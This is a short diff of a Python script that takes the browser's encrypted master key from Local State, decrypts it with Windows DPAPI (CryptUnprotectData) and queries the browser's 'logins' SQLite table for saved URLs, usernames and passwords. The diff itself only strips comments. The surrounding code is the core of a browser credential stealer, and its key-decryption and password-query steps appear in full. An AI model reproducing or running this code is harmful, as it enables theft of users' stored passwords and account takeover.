@@ -24,9 +24,7 @@ def get_encryption_key():
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     # remove DPAPI str
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 
@@ -60,7 +58,7 @@ def main():
     # connect to the database
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    # `logins` table has the data we need
+    
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
     for row in cursor.fetchall():
